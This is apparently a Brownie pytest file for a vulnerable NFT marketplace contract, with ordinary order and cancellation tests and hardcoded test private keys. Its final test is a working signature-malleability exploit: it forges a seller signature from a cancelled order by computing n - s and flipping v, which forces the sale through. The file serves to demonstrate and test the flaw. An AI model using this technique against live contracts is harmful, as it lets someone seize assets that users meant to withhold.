#!/usr/bin/python3
import brownie
import pytest
import os

from brownie.network.account import defunct_hash_message, eth_keys, sign_message_hash, HexBytes

@pytest.fixture(scope="function", autouse=True)
def isolate(fn_isolation):
    # perform a chain rewind after completing each test, to ensure proper isolation
    # https://eth-brownie.readthedocs.io/en/v1.10.3/tests-pytest-intro.html#isolation-fixtures
    pass

@pytest.fixture(scope="module")
def deployer(accounts):
    return accounts[0]

@pytest.fixture(scope="module")
def buyer(accounts):
    return accounts.add('120104ed2807b15b1c0f514234d08fd9d6c9f073d242240ee31ada96cd5f0277')

@pytest.fixture(scope="module")
def seller(accounts):
    return accounts.add('8fa2fdfb89003176a16b707fc860d0881da0d1d8248af210df12d37860996fb2')

def privkey(x):
    return eth_keys.keys.PrivateKey(HexBytes(x.private_key))

@pytest.fixture(scope="module")
def token(PaymentToken, deployer, buyer):
    t = PaymentToken.deploy(1000, {'from': deployer})
    t.transfer(buyer, 100, {'from': deployer})
    return t

@pytest.fixture(scope="module")
def nft(NFT, deployer, seller):
    t = NFT.deploy({'from': deployer})
    t.transferFrom(deployer, seller, 1, {'from': deployer})
    t.transferFrom(deployer, seller, 2, {'from': deployer})
    return t

@pytest.fixture(scope="module")
def market(CheapMarketplace, token, nft, deployer, seller):
    return CheapMarketplace.deploy(token.address, nft.address, {'from': deployer})

def test_setup(market, nft, token, deployer, buyer, seller):
    assert token.balanceOf(buyer) == 100
    assert nft.ownerOf(1) == seller
    assert nft.ownerOf(2) == seller
    assert nft.ownerOf(3) == deployer

def test_cancel(market, seller):
    msg = market.orderMessage(False, seller, 1, 42)
    (v, r, s, _) = sign_message_hash(privkey(seller), msg)
    market.cancelOrder(False, seller, 1, 42, [v, r, s], {'from': seller})


def test_atomic_match(market, seller, buyer, deployer, nft, token):
    nft.approve(market, 1, {'from': seller})
    token.approve(market, 1000, {'from': buyer})

    msg_sell = market.orderMessage(False, seller, 1, 42)
    msg_buy = market.orderMessage(True, buyer, 1, 42)

    (v, r, s, _) = sign_message_hash(privkey(buyer), msg_buy)
    vrsBuy = [v, r, s]
    (v, r, s, _) = sign_message_hash(privkey(seller), msg_sell)
    vrsSell = [v, r, s]

    assert nft.ownerOf(1) == seller
    market.atomicMatch(1, buyer, 42, vrsBuy, seller, 42, vrsSell, {'from': deployer})
    assert nft.ownerOf(1) == buyer


def test_match_after_cancel_must_fail(market, seller, buyer, deployer, nft, token):
    nft.approve(market, 1, {'from': seller})
    token.approve(market, 1000, {'from': buyer})

    msg_sell = market.orderMessage(False, seller, 1, 42)
    msg_buy = market.orderMessage(True, buyer, 1, 42)

    (v, r, s, _) = sign_message_hash(privkey(buyer), msg_buy)
    vrsBuy = [v, r, s]
    (v, r, s, _) = sign_message_hash(privkey(seller), msg_sell)
    vrsSell = [v, r, s]

    market.cancelOrder(False, seller, 1, 42, [v, r, s], {'from': seller})

    assert nft.ownerOf(1) == seller
    with brownie.reverts():
        market.atomicMatch(1, buyer, 42, vrsBuy, seller, 42, vrsSell, {'from': deployer})
    assert nft.ownerOf(1) == seller


def test_atomic_match_exploit(market, seller, buyer, deployer, nft, token):
    nft.approve(market, 1, {'from': seller})
    token.approve(market, 1000, {'from': buyer})

    msg_sell = market.orderMessage(False, seller, 1, 42)
    msg_buy = market.orderMessage(True, buyer, 1, 42)

    (v, r, s, _) = sign_message_hash(privkey(buyer), msg_buy)
    vrsBuy = [v, r, s]
    (v, r, s, _) = sign_message_hash(privkey(seller), msg_sell)

    market.cancelOrder(False, seller, 1, 42, [v, r, s], {'from': seller})

    # Let's fabricate a different signature from the seller based on the original
    n = 115792089237316195423570985008687907852837564279074904382605163141518161494337
    s_prime = n - s
    v_prime = 27 + 28 - v
    vrsSell = [v_prime, r, s_prime]

    assert nft.ownerOf(1) == seller
    market.atomicMatch(1, buyer, 42, vrsBuy, seller, 42, vrsSell, {'from': deployer})
    assert nft.ownerOf(1) == buyer
